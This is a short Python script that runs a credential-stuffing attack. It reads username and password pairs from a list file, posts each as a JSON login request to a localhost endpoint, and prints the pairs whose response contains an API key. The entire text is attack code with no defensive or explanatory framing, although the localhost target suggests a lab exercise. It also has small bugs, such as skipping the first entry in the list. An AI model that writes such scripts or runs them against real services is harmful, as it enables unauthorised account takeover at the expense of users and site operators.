import requests

try:
    cred_list = open('credlist.txt')
    line = cred_list.readline().rstrip()
    while line:
        line = cred_list.readline().rstrip()
        x = line.split(",")
        uname=x[0]
        passwd =x[1]
        jstr = '{"uname":"'+uname.rstrip()+'","pass":"'+passwd.rstrip()+'"}'
        #print(jstr)   
        resp = requests.post('http://localhost/login',jstr )
        #print(resp.text)
        if 'APIKEY' in resp.text:
                print("VALID CRED : " + line)
except Exception as e:
  print(e)
  print("Finshed iterating the file")

